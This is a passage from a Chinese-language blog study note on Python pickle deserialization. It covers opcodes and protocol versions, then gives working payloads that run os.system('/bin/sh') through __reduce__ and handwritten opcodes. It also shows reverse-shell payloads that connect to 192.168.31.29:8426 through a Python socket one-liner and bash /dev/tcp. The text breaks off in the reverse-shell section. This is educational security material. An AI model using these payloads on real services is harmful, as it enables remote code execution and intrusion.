<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><title>AmiaaaZ's Site | 反序列化专题笔记·壹·python篇</title><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=generator content="Hugo 0.111.3"><meta name=ROBOTS content="INDEX, FOLLOW"><link href=/dist/app.css rel=stylesheet><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-203328343-1","auto"),ga("send","pageview"))</script><link rel=stylesheet href=https://amiaaaz.github.io/lib/katex.min.css crossorigin=anonymous><script defer src=https://amiaaaz.github.io/lib/katex.min.js crossorigin=anonymous></script>
<script defer src=https://amiaaaz.github.io/lib/contrib/auto-render.min.js crossorigin=anonymous onload=renderMathInElement(document.body)></script>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><script>(function(e,t){var s=document,o="script",n=s.createElement(o),i=s.getElementsByTagName(o)[0];n.src=e,t&&n.addEventListener("load",function(e){t(e)}),i.parentNode.insertBefore(n,i)})("https://amiaaaz.github.io/lib/pangu.min.js",function(){pangu.spacingPage()})</script><style type=text/css media="screen, print">@font-face{font-family:fancytitlefont;font-style:normal;font-display:swap;src:url(%25!s%28%3cnil%3e%29.woff2)format('woff2'),url(%25!s%28%3cnil%3e%29.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:300;font-display:swap;src:local('Noto Serif CJK SC Light'),local('NotoSerifCJK-Light'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:400;font-display:swap;src:local('Noto Serif CJK SC'),local('NotoSerifCJK-Regular'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:500;font-display:swap;src:local('Noto Serif CJK SC Medium'),local('NotoSerifCJK-Medium'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff)format('woff')}</style></head><body class="bg-gray-100 text-gray-700 font-sans"><div class="p-6 sm:p-10 md:p-16 flex flex-wrap"><header class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-1 md:order-1 max-w-2xl"><div class="z-50 bg-gray-100 bg-opacity-75 bg-opacity-custom lg:min-w-0.7 max-w-xl md:float-right md:text-right leading-loose tracking-tight md:sticky md:top-0 pt-2"><div><h2><a href=https://amiaaaz.github.io/ title="AmiaaaZ's Site" class="heading font-cursive icon">AmiaaaZ's Site</a></h2></div><h1 class=pt-2>反序列化专题笔记·壹·python篇</h1><h3 class="text-java-700 font-normal leading-relaxed pt-2">对于反序列化的认识总是不深刻，所以有了这一系列总结。这是反序列化专题的第一篇，也是python的第一篇。</h3><div class="flex flex-wrap justify-end pt-2"><div class="md:flex-grow-0 font-light"><a class="post-taxonomy-category text-medium-red-violet-600 hover:text-medium-red-violet-400" href=/categories/notessummary>NOTES&amp;SUMMARY</a>
&nbsp;&nbsp;
<a class="post-taxonomy-tag text-eucalyptus-500" href=/tags/python>python</a>&nbsp;/
<a class="post-taxonomy-tag text-eucalyptus-500" href=/tags/unserialize>unserialize</a></div><time class="text-eucalyptus-500 md:text-right md:flex-grow font-light pl-4" datetime=2021-08-12T11:48:05+08:00>2021-8-12 11:48</time></div><details class=toc open><summary><hr></summary><div class="inline toc-content"><nav id=TableOfContents><ul><li><a href=#序列化反序列化>序列化&反序列化</a></li><li><a href=#可以利用的方向思路>可以利用的方向&思路</a><ul><li><a href=#此处上一个简单的小栗子>此处上一个简单的小栗子</a></li><li><a href=#另一个反弹shell的小栗子>另一个反弹shell的小栗子</a></li><li><a href=#用marshal序列化任意代码对象>用Marshal序列化任意代码对象</a></li><li><a href=#工具二连---通过upkeruhttpsgithubcomeddieivan01pker构造opcode>工具二连 - 通过<a href=https://github.com/eddieivan01/pker><u>pker</u></a>构造opcode</a></li><li><a href=#工具二连---uanapickleuhttpsgithubcomsensepostanapickle>工具二连 - <a href=https://github.com/sensepost/anapickle><u>anapickle</u></a></a></li></ul></li><li><a href=#bypass>bypass!!!</a><ul><li><a href=#对类型的检查>对类型的检查</a></li><li><a href=#限制bc对模块的引入---find_class的重写>限制<code>b'c'</code>对模块的引入 - <code>find_class()</code>的重写</a></li><li><a href=#--仅可以引入__main__开头的模块>&ndash;&#187;仅可以引入<code>__main__</code>开头的模块</a></li><li><a href=#--仅可以引入题目中自设的模块模块名不能有__符>&ndash;&#187;仅可以引入题目中自设的模块&模块名不能有<code>__</code>符</a></li><li><a href=#--仅可以引入builtins模块>&ndash;&#187;仅可以引入<code>builtins</code>模块</a></li><li><a href=#--仅可以引入sys模块名字中不带点号>&ndash;&#187;仅可以引入<code>sys</code>模块&名字中不带<code>.</code>点号</a></li><li><a href=#--仅可以引入题目中自设空模块>&ndash;&#187;仅可以引入题目中自设空模块</a></li><li><a href=#禁止br操作码>禁止<code>b'R'</code>操作码</a></li><li><a href=#--变量覆盖>&ndash;&#187;变量覆盖</a></li><li><a href=#--使用__setstate__bb实现rce>&ndash;&#187;使用<code>__setstate__</code>&<code>b'b'</code>实现rce</a></li><li><a href=#--使用_instantiateload_objload_instbobi实现rce>&ndash;&#187;使用<code>_instantiate()</code>&<code>load_obj()</code>&<code>load_inst()</code>&<code>b'o'</code>&<code>b'i'</code>实现rce</a></li><li><a href=#--使用_getattributeload_objload_inst实现任意文件读取>&ndash;&#187;使用<code>_getattribute()</code>&<code>load_obj()</code>&<code>load_inst()</code>实现任意文件读取</a></li></ul></li><li><a href=#一些小技巧注意事项>一些小技巧&注意事项</a><ul><li><a href=#最后出于安全角度的考量>最后，出于安全角度的考量</a></li></ul></li></ul></nav></div></details><hr></div></header><main role=main class="w-full md:w-3/5 xl:w-1/2 max-w-3xl order-2 md:order-2 min-h-70vh pt-2 pb-4"><article><section class="mx-auto content"><div class=c-rich-text><h2 id=序列化反序列化>序列化&反序列化</h2><p>在python中有好几个内置模块都可以干序列化&反序列化这个事，比如<a href=https://www.cnblogs.com/gcgc/p/10973418.html#_label2>json</a>, <a href=https://www.cnblogs.com/gcgc/p/10973418.html#_label3>pickle</a>/<a href=https://docs.python.org/2/library/pickle.html#module-cPickle>cpickle</a>, <a href=https://www.cnblogs.com/gcgc/p/10973418.html#_label4>shelve</a>, <a href=https://docs.python.org/zh-cn/3/library/marshal.html>marshal</a>，而本文后面涉及到的序列化和反序列化操作若无特殊说明，指的都是pickle。</p><p>pickle后的对象以二进制字节流存储，能表示python几乎所有的类型（包括自定义类型），比如</p><ul><li><code>None</code> 、 <code>True</code> 和 <code>False</code></li><li>整数、浮点数、复数</li><li>str、byte、bytearray</li><li>只包含可封存对象的集合，包括 tuple、list、set 和 dict</li><li>定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以）</li><li>定义在模块最外层的内置函数</li><li>定义在模块最外层的类</li><li><code>__dict__</code> 属性值或 <code>__getstate__()</code> 函数的返回值可以被序列化的类（详见官方文档的Pickling Class Instances）</li></ul><p>当然也有例外，比如文件对象和网络套接字对象以及代码对象就不可以。</p><p>对于一个Object，可以通过重写<code>object.__reduce__()</code>函数，使其被序列化时按照重写的方式进行；此函数会返回一个<code>(callable, ([para1, para2, ...])[, ...])</code>的元组，每当该类的对象被unpickle时，该callable就会被调用以生成对象（该callable其实是构造函数）。</p><p>pickle的常用方法有dumps(), loads()和dump(), load()，不带s的需要的参数是文件句柄，而带s的所需要的参数是字符串。</p><p>说到pickle不得不谈的是opcode，即<u>PVM(python virtual machine)</u>的操作码，它可以被PVM的解析引擎解释处理。目前opcode有多不同的实现版本（但向下兼容），其中py2和py3序列化的结果是不同的，可以在调用函数时指定协议版本。</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>pickle</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>a</span><span style=color:#f92672>=</span><span style=color:#111>{</span><span style=color:#d88200>&#39;1&#39;</span><span style=color:#111>:</span> <span style=color:#ae81ff>1</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;2&#39;</span><span style=color:#111>:</span> <span style=color:#ae81ff>2</span><span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>for</span> <span style=color:#111>i</span> <span style=color:#f92672>in</span> <span style=color:#111>range</span><span style=color:#111>(</span><span style=color:#ae81ff>4</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>    <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#d88200>f</span><span style=color:#d88200>&#39;ver_</span><span style=color:#d88200>{</span><span style=color:#111>i</span><span style=color:#d88200>}</span><span style=color:#d88200>&#39;</span><span style=color:#111>,</span><span style=color:#111>pickle</span><span style=color:#f92672>.</span><span style=color:#111>dumps</span><span style=color:#111>(</span><span style=color:#111>a</span><span style=color:#111>,</span><span style=color:#111>protocol</span><span style=color:#f92672>=</span><span style=color:#111>i</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># python3输出 protocol&lt;=5</span>
</span></span><span style=display:flex><span><span style=color:#111>ver_0</span><span style=color:#111>:</span> <span style=color:#d88200>b</span><span style=color:#d88200>&#39;(dp0</span><span style=color:#8045ff>\n</span><span style=color:#d88200>V1</span><span style=color:#8045ff>\n</span><span style=color:#d88200>p1</span><span style=color:#8045ff>\n</span><span style=color:#d88200>I1</span><span style=color:#8045ff>\n</span><span style=color:#d88200>sV2</span><span style=color:#8045ff>\n</span><span style=color:#d88200>p2</span><span style=color:#8045ff>\n</span><span style=color:#d88200>I2</span><span style=color:#8045ff>\n</span><span style=color:#d88200>s.&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>ver_1</span><span style=color:#111>:</span> <span style=color:#d88200>b</span><span style=color:#d88200>&#39;}q</span><span style=color:#8045ff>\x00</span><span style=color:#d88200>(X</span><span style=color:#8045ff>\x01\x00\x00\x00</span><span style=color:#d88200>1q</span><span style=color:#8045ff>\x01</span><span style=color:#d88200>K</span><span style=color:#8045ff>\x01</span><span style=color:#d88200>X</span><span style=color:#8045ff>\x01\x00\x00\x00</span><span style=color:#d88200>2q</span><span style=color:#8045ff>\x02</span><span style=color:#d88200>K</span><span style=color:#8045ff>\x02</span><span style=color:#d88200>u.&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>ver_2</span><span style=color:#111>:</span> <span style=color:#d88200>b</span><span style=color:#d88200>&#39;</span><span style=color:#8045ff>\x80\x02</span><span style=color:#d88200>}q</span><span style=color:#8045ff>\x00</span><span style=color:#d88200>(X</span><span style=color:#8045ff>\x01\x00\x00\x00</span><span style=color:#d88200>1q</span><span style=color:#8045ff>\x01</span><span style=color:#d88200>K</span><span style=color:#8045ff>\x01</span><span style=color:#d88200>X</span><span style=color:#8045ff>\x01\x00\x00\x00</span><span style=color:#d88200>2q</span><span style=color:#8045ff>\x02</span><span style=color:#d88200>K</span><span style=color:#8045ff>\x02</span><span style=color:#d88200>u.&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>ver_3</span><span style=color:#111>:</span> <span style=color:#d88200>b</span><span style=color:#d88200>&#39;</span><span style=color:#8045ff>\x80\x03</span><span style=color:#d88200>}q</span><span style=color:#8045ff>\x00</span><span style=color:#d88200>(X</span><span style=color:#8045ff>\x01\x00\x00\x00</span><span style=color:#d88200>1q</span><span style=color:#8045ff>\x01</span><span style=color:#d88200>K</span><span style=color:#8045ff>\x01</span><span style=color:#d88200>X</span><span style=color:#8045ff>\x01\x00\x00\x00</span><span style=color:#d88200>2q</span><span style=color:#8045ff>\x02</span><span style=color:#d88200>K</span><span style=color:#8045ff>\x02</span><span style=color:#d88200>u.&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>ver_4</span><span style=color:#111>:</span> <span style=color:#d88200>b</span><span style=color:#d88200>&#39;</span><span style=color:#8045ff>\x80\x04\x95\x11\x00\x00\x00\x00\x00\x00\x00</span><span style=color:#d88200>}</span><span style=color:#8045ff>\x94</span><span style=color:#d88200>(</span><span style=color:#8045ff>\x8c\x01</span><span style=color:#d88200>1</span><span style=color:#8045ff>\x94</span><span style=color:#d88200>K</span><span style=color:#8045ff>\x01\x8c\x01</span><span style=color:#d88200>2</span><span style=color:#8045ff>\x94</span><span style=color:#d88200>K</span><span style=color:#8045ff>\x02</span><span style=color:#d88200>u.&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>ver_5</span><span style=color:#111>:</span> <span style=color:#d88200>b</span><span style=color:#d88200>&#39;</span><span style=color:#8045ff>\x80\x05\x95\x11\x00\x00\x00\x00\x00\x00\x00</span><span style=color:#d88200>}</span><span style=color:#8045ff>\x94</span><span style=color:#d88200>(</span><span style=color:#8045ff>\x8c\x01</span><span style=color:#d88200>1</span><span style=color:#8045ff>\x94</span><span style=color:#d88200>K</span><span style=color:#8045ff>\x01\x8c\x01</span><span style=color:#d88200>2</span><span style=color:#8045ff>\x94</span><span style=color:#d88200>K</span><span style=color:#8045ff>\x02</span><span style=color:#d88200>u.&#39;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># python2输出 protocal&lt;=2</span>
</span></span><span style=display:flex><span><span style=color:#111>ver_0</span><span style=color:#111>:</span> <span style=color:#111>(</span><span style=color:#111>dp0</span>
</span></span><span style=display:flex><span><span style=color:#111>S</span><span style=color:#d88200>&#39;1&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>p1</span>
</span></span><span style=display:flex><span><span style=color:#111>I1</span>
</span></span><span style=display:flex><span><span style=color:#111>sS</span><span style=color:#d88200>&#39;2&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>p2</span>
</span></span><span style=display:flex><span><span style=color:#111>I2</span>
</span></span><span style=display:flex><span><span style=color:#111>s</span><span style=color:#f92672>.</span>
</span></span><span style=display:flex><span><span style=color:#111>ver_1</span><span style=color:#111>:</span> <span style=color:#111>}</span><span style=color:#111>q</span><span style=color:#111>(</span><span style=color:#111>U</span><span style=color:#960050;background-color:#1e0010></span><span style=color:#ae81ff>1</span><span style=color:#111>q</span><span style=color:#960050;background-color:#1e0010></span><span style=color:#111>K</span><span style=color:#960050;background-color:#1e0010></span><span style=color:#111>U</span><span style=color:#960050;background-color:#1e0010></span><span style=color:#ae81ff>2</span><span style=color:#111>q</span><span style=color:#960050;background-color:#1e0010></span><span style=color:#111>K</span><span style=color:#960050;background-color:#1e0010></span><span style=color:#111>u</span><span style=color:#f92672>.</span>
</span></span><span style=display:flex><span><span style=color:#111>ver_2</span><span style=color:#111>:</span> <span style=color:#960050;background-color:#1e0010>�</span><span style=color:#111>}</span><span style=color:#111>q</span><span style=color:#111>(</span><span style=color:#111>U</span><span style=color:#960050;background-color:#1e0010></span><span style=color:#ae81ff>1</span><span style=color:#111>q</span><span style=color:#960050;background-color:#1e0010></span><span style=color:#111>K</span><span style=color:#960050;background-color:#1e0010></span><span style=color:#111>U</span><span style=color:#960050;background-color:#1e0010></span><span style=color:#ae81ff>2</span><span style=color:#111>q</span><span style=color:#960050;background-color:#1e0010></span><span style=color:#111>K</span><span style=color:#960050;background-color:#1e0010></span><span style=color:#111>u</span><span style=color:#f92672>.</span>
</span></span></code></pre></div><p>0号版本序列化的结果看起来可读性很强 都是可视的字符，操作码也比较直接地暴露出来，重点关注几个：</p><table><thead><tr><th>Opcode</th><th>Mnemonic</th><th>Description</th></tr></thead><tbody><tr><td>(</td><td>MARK</td><td>Push a mark object onto the stack</td></tr><tr><td>S</td><td>STRING</td><td>string</td></tr><tr><td>I</td><td>INT</td><td>Push integer or bool; decimal string argument</td></tr><tr><td>l</td><td>LIST</td><td>build a list from topmost stack items</td></tr><tr><td>d</td><td>DICT</td><td>build a dict from stack items</td></tr><tr><td>}</td><td>EMPTY_DICT</td><td>Push empty dict</td></tr><tr><td>t</td><td>TUPLE</td><td>Build a tuple from topmost stack items</td></tr><tr><td>)</td><td>EMPTY_TUPLE</td><td>Push empty tuple</td></tr><tr><td>c</td><td>GLOBAL</td><td>Push self.find_class(module, args); 2 string args</td></tr><tr><td>R</td><td>REDUCE</td><td>Apply callable to argtuple, both on stack</td></tr><tr><td>b</td><td>BUILD</td><td>call <code>__setstate__</code> or <code>__dict__.update()</code></td></tr><tr><td>i</td><td>INST</td><td>build & push class instance</td></tr><tr><td>o</td><td>OBJ</td><td>build & push class instance</td></tr><tr><td>.</td><td>STOP</td><td>Every pickle ends with STOP</td></tr></tbody></table><p>使用**<u>pickletools</u>**可以将opcode转化为肉眼可读取的形式</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>pickletools</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>data</span><span style=color:#f92672>=</span><span style=color:#d88200>b</span><span style=color:#d88200>&#34;</span><span style=color:#8045ff>\x80\x03</span><span style=color:#d88200>cbuiltins</span><span style=color:#8045ff>\n</span><span style=color:#d88200>exec</span><span style=color:#8045ff>\n</span><span style=color:#d88200>q</span><span style=color:#8045ff>\x00</span><span style=color:#d88200>X</span><span style=color:#8045ff>\x13\x00\x00\x00</span><span style=color:#d88200>key1=b&#39;1&#39;</span><span style=color:#8045ff>\n</span><span style=color:#d88200>key2=b&#39;2&#39;q</span><span style=color:#8045ff>\x01\x85</span><span style=color:#d88200>q</span><span style=color:#8045ff>\x02</span><span style=color:#d88200>Rq</span><span style=color:#8045ff>\x03</span><span style=color:#d88200>.&#34;</span>
</span></span><span style=display:flex><span><span style=color:#111>pickletools</span><span style=color:#f92672>.</span><span style=color:#111>dis</span><span style=color:#111>(</span><span style=color:#111>data</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0</span><span style=color:#111>:</span> \<span style=color:#111>x80</span> <span style=color:#111>PROTO</span>      <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>2</span><span style=color:#111>:</span> <span style=color:#111>c</span>    <span style=color:#111>GLOBAL</span>     <span style=color:#d88200>&#39;builtins exec&#39;</span>
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>17</span><span style=color:#111>:</span> <span style=color:#111>q</span>    <span style=color:#111>BINPUT</span>     <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>19</span><span style=color:#111>:</span> <span style=color:#111>X</span>    <span style=color:#111>BINUNICODE</span> <span style=color:#d88200>&#34;key1=b&#39;1&#39;</span><span style=color:#8045ff>\n</span><span style=color:#d88200>key2=b&#39;2&#39;&#34;</span>
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>43</span><span style=color:#111>:</span> <span style=color:#111>q</span>    <span style=color:#111>BINPUT</span>     <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>45</span><span style=color:#111>:</span> \<span style=color:#111>x85</span> <span style=color:#111>TUPLE1</span>
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>46</span><span style=color:#111>:</span> <span style=color:#111>q</span>    <span style=color:#111>BINPUT</span>     <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>48</span><span style=color:#111>:</span> <span style=color:#111>R</span>    <span style=color:#111>REDUCE</span>
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>49</span><span style=color:#111>:</span> <span style=color:#111>q</span>    <span style=color:#111>BINPUT</span>     <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>51</span><span style=color:#111>:</span> <span style=color:#f92672>.</span>    <span style=color:#111>STOP</span>
</span></span><span style=display:flex><span><span style=color:#111>highest</span> <span style=color:#111>protocol</span> <span style=color:#111>among</span> <span style=color:#111>opcodes</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>
</span></span></code></pre></div><h2 id=可以利用的方向思路>可以利用的方向&思路</h2><p>pickle的应用场景其实很广泛</p><ul><li>解析认证token, session时；参见：<a href=https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html>掌阅iReader某站Python漏洞挖掘</a>（一个redis+python反序列化的栗子</li><li>可能将对象pickle后存储成磁盘文件</li><li>可能将对象pickle后在网络中传输</li><li>可能会通过参数传递给程序；参见：<a href=https://blog.knownsec.com/2015/12/sqlmap-code-execution-vulnerability-analysis/>sqlmap的代码执行漏洞</a></li></ul><p>这里说一下第一点，flask配合redis在服务端存储session（以pickle序列化形式进行存储），如果通过cookie进行请求session_id时，session种的内容就会被反序列化。理论上没问题，但如果出现redis的未授权访问，就可以通过自己设计恶意的session，然后再设置cookie去请求session时，我们自定的内容就会被反序列化，达到了rce的目的。</p><p>构造反序列化的payload离不开<code>__reduce__</code>这个魔术方法（上文简单的提到过），它是新式类（内置类）特有的方法（关于更多python元类相关的知识可以参考stackoverflow的这篇帖子：<a href=https://stackoverflow.com/questions/100003/what-are-metaclasses-in-python>What are metaclasses in Python?</a>）</p><p>————在python2有两种声明类的方式，并且它们实例化的对象性质是不同的</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809005621153.png alt=image-20210809005621153></p><p>python3中消除了两者的区别，表现为第二种</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809005849080.png alt=image-20210809005849080></p><p>回到关于<code>__reduce__</code>的问题，只要在新式类中定义一个 <code>__reduce__</code> 方法，我们就能在序列化的使用让这个类根据我们在<code>__reduce__</code> 中指定的方式进行序列化。指定的关键就在于该方法的返回值上：一个<code>callable</code>可调用的对象，一个是<code> ([para1, para2, ...])[, ...])</code>，该对象所需的参数元组；最简单的例子是<code>return (os.system, ('ls',))</code>。<code>__reduce__</code> 方法与opcode中的R指令码关系密切，可以说PVM的R指令码就是<code>__reduce__</code>的返回值的一个底层实现。</p><h3 id=此处上一个简单的小栗子>此处上一个简单的小栗子</h3><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># shell.pickle</span>
</span></span><span style=display:flex><span><span style=color:#111>cos</span>
</span></span><span style=display:flex><span><span style=color:#111>system</span>
</span></span><span style=display:flex><span><span style=color:#111>(</span><span style=color:#111>S</span><span style=color:#d88200>&#39;/bin/sh&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>tR</span><span style=color:#f92672>.</span>
</span></span></code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809002248690.png alt=image-20210809002248690></p><p>上面手写的opcode成功返回了sh的shell；而通过dumps和loads实现则是这样；我们执行的代码都在<code>__reduce__</code>中</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># py2</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>pickle</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>os</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>class</span> <span style=color:#75af00>A</span><span style=color:#111>(</span><span style=color:#111>object</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>def</span> <span style=color:#75af00>__reduce__</span><span style=color:#111>(</span><span style=color:#111>self</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>        <span style=color:#111>a</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;/bin/sh&#39;</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#111>(</span><span style=color:#111>os</span><span style=color:#f92672>.</span><span style=color:#111>system</span><span style=color:#111>,(</span><span style=color:#111>a</span><span style=color:#111>,))</span>
</span></span><span style=display:flex><span><span style=color:#111>a</span> <span style=color:#f92672>=</span> <span style=color:#111>A</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span><span style=color:#111>test</span> <span style=color:#f92672>=</span> <span style=color:#111>pickle</span><span style=color:#f92672>.</span><span style=color:#111>dumps</span><span style=color:#111>(</span><span style=color:#111>a</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>print</span> <span style=color:#111>test</span>
</span></span><span style=display:flex><span><span style=color:#111>pickle</span><span style=color:#f92672>.</span><span style=color:#111>loads</span><span style=color:#111>(</span><span style=color:#111>test</span><span style=color:#111>)</span>
</span></span></code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809011024984.png alt=image-20210809011024984></p><p>也顺利返回了shell，很容易发现跟上面手写的opcode并无差异，而这个核心就是构造时的<code>__reduce__</code>函数的返回值，我们可以利用它来rce，反弹shell之类的。</p><h3 id=另一个反弹shell的小栗子>另一个反弹shell的小栗子</h3><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>pickle</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>os</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>class</span> <span style=color:#75af00>A</span><span style=color:#111>(</span><span style=color:#111>object</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>def</span> <span style=color:#75af00>__reduce__</span><span style=color:#111>(</span><span style=color:#111>self</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>        <span style=color:#111>a</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;&#34;&#34;python2 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;192.168.31.29&#34;,8426));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#111>(</span><span style=color:#111>os</span><span style=color:#f92672>.</span><span style=color:#111>system</span><span style=color:#111>,(</span><span style=color:#111>a</span><span style=color:#111>,))</span>
</span></span><span style=display:flex><span><span style=color:#111>a</span><span style=color:#f92672>=</span><span style=color:#111>A</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span><span style=color:#111>result</span> <span style=color:#f92672>=</span> <span style=color:#111>pickle</span><span style=color:#f92672>.</span><span style=color:#111>dumps</span><span style=color:#111>(</span><span style=color:#111>a</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>pickle</span><span style=color:#f92672>.</span><span style=color:#111>loads</span><span style=color:#111>(</span><span style=color:#111>result</span><span style=color:#111>)</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># 或者最简单的手写opcode 不用特意构造class A()</span>
</span></span><span style=display:flex><span><span style=color:#111>cos</span>
</span></span><span style=display:flex><span><span style=color:#111>system</span>
</span></span><span style=display:flex><span><span style=color:#111>(</span><span style=color:#111>S</span><span style=color:#d88200>&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/192.168.31.29/8426 0&gt;&amp;1&#34;&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>tR</span><span style=color:#f92672>.</span>
